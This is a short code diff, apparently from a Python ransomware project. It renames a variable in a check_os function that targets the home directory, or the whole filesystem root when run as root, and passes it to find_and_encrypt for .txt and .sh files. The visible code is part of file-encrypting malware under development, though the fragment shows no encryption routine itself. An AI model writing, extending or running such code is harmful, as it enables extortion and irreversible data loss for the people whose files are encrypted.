@@ -15,10 +15,10 @@ from Crypto import Random
 
 
 def check_os(osname: str) -> str | None:
-    USER_DIR = os.getenv('HOME')
+    PATH = os.getenv('HOME')
     
     if (os.getuid() == 0):
-        USER_DIR = '/'
+        PATH = '/'
     
     # # check if os is linux.
     is_linux = [
@@ -34,7 +34,7 @@ def check_os(osname: str) -> str | None:
         sys.version[0] == '3')
     ):
         find_and_encrypt(
-            path=USER_DIR,
+            path=PATH,
             ext_files=['.txt', '.sh'],
             cd=['/bin', '/sbin', '/etc', '/lib', '/usr/lib', '/boot'],
             hidden='.',
